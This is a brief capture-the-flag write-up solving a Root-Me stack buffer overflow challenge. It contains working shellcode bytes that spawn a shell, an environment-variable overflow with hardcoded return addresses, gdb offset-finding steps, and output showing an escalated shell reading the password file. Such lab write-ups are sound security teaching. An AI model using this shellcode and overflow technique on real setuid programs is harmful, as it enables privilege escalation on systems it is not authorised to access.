# rootme : ELF x86 - Stack buffer overflow basic 4

https://www.root-me.org/en/Challenges/App-System/ELF-x86-Stack-buffer-overflow-basic-4


Can make use of generic spawn /bin/dash shellcode and insert into start of env struct, the home array.  Overflow the path array into RET address.

    export HOME=$(python -c 'print "\xeb\x1d\x5b\x31\xd2\x89\xd9\x83\xc1\x04\x83\xc1\x05\x88\x11\x31\xc0\xb0\x0b\x31\xc9\xcd\x80\x31\xc0\xb0\x01\x31\xdb\xcd\x80\xe8\xde\xff\xff\xff\x2f\x62\x69\x6e\x2f\x64\x61\x73\x68\x41"')

    export PATH=$(/usr/bin/python -c 'print "\x41" * 160 + "\x3c\xf5\xff\xbf" + "\x70\xf7\xff\xbf"')


This exercise is fiddly due to environmental variables shifting stack offsets.  Place junk addresses into PATH to begin with and use gdb to find correct offsets.  Remember to remove the gdb additions to env.

    (gdb) unset env LINES
    (gdb) unset env COLUMNS


Address of home:

    (gdb) p/x $ebp-0x21c
    $1 = 0xbffff53c


Address of RET to main and env struct argument, string terminator will clear least significant byte of the argument causing havok.  Must pass two addresses to PATH, new shellcode address and original env arg address.

    (gdb) p/x ($1+0x180+0xa0)
    $2 = 0xbffff75c

    (gdb) x/2wx $2
    0xbffff75c:     0x08048679      0xbffff770


Satisfying:

    app-systeme-ch8@challenge02:/challenge/app-systeme/ch8$ ./ch8
    [+] Getting env...
    $ id
    uid=1108(app-systeme-ch8) gid=1108(app-systeme-ch8) euid=1208(app-systeme-ch8-cracked) groups=1208(app-systeme-ch8-cracked),100(users),1108(app-systeme-ch8)
    $ cat .passwd
    ...
